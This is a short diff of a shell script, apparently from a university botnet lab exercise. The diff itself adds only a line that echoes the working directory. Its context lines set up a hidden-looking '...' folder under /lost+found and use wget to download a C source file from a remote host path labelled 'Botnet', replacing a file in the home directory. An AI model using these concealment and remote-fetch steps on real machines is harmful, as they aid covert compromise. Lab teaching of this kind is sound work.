@@ -7,6 +7,8 @@ BACKUP="${FULLPATH}_old"
 DIR='/lost+found/'
 FOLDER='...'
 
+echo running: `pwd` 
+
 rm ~/cgethttp.c                                                                                                             
 wget "abstract.cs.washington.edu/~roy/lab3/Botnet/cgethttp_old.c"                      
 mv cgethttp_old.c ~/cgethttp.c
